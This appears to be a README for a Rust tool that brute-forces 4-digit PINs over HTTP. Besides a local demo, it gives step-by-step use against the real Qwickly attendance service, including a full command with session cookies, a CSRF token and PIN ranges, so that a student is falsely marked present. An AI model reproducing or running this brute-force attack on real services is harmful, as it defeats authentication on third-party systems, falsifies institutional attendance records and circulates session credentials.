# Crack Remote Pin
Rust example of cracking a 4-digit pin on a remote server.  

The cracking HTTP requests are executed asynchronously, so the futures will take some time to build up to 10000 in a vector and then executed at once roughly (there are probably better ways to do this, but I've found this to work well enough for 10k).  

1. Start the pin server
```
cd pin_server
cargo run
```

2. Crack the pin on the running server
```
cd cracker
cargo run
```

## Qwickly Attendance Crack
The qwickly attendance checker asks for a 4-digit pin, which a lecturer will share with the class on a screen. Luckily qwickly don't have any spam-defense mechanisms at all, I can make 1000 POST requests with different pins in a short space of time without it preventing it.

The request needs to be crafted properly though to post without hitting an error:

1. Visit Qwickly attendance tracker page and just make a request for pin "0001", have "network" tab of browser tools open and "copy as cURL" the request

2. Take the required fields out of that and use it in the command make sure to replace "0001" with "{pin}" in the data content, for example: 

```
qwickly_cracker --referer 'https://www.qwickly.tools/attendance/takerecord/?code=BuYAp0o5b11JNFonnZtFrqWxYX2xAI3B&' --user-agent 'Mozilla/5.0 (X11; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0' --cookie 'AWSALB=AoMLFg/sY5unylBB4wo1UuftVvB74l2QvqGuwUZZzkBBPD+04k7cu0Py692RPzeMSdmMSJxUqKhsFWj8X162GHWtMWjr9IPAyE8FTMNXC98aawjJqkylnkNLhKeb; AWSALBCORS=AoMLFg/sY5unylBB4wo1UuftVvB74l2QvqGuwUZZzkBBPD+04k7cu0Py692RPzeMSdmMSJxUqKhsFWj8X162GHWtMWjr9IPAyE8FTMNXC98aawjJqkylnkNLhKeb; sessionid=if3l9orgzd7ydeah0baqn7ynlg2anp1w' --data-no-pin 'csrfmiddlewaretoken=MpUgZaDVxhfOq41BuGIrIGHXzUz8pfWrLiApCa7XM7OTISwq50dx7hvLQnvYiTZV&check_in_pin={pin}&student_check_in=Check+In&check_in_id=' --start 2000 --end 3000 > crack_2000_3000
```

3. Profit, right now the cracker requires you to stay to a 1000 limit or it just drops and doesn't check all the pins(probably OS-level too many TCP connections being opened), so go for 1000-2001, 2000-3001, and chances are you'll crack it by 5000-6001. Once the cracker hits the correct pin it'll print it, and on qwickly you'll get marked as "Present" lol
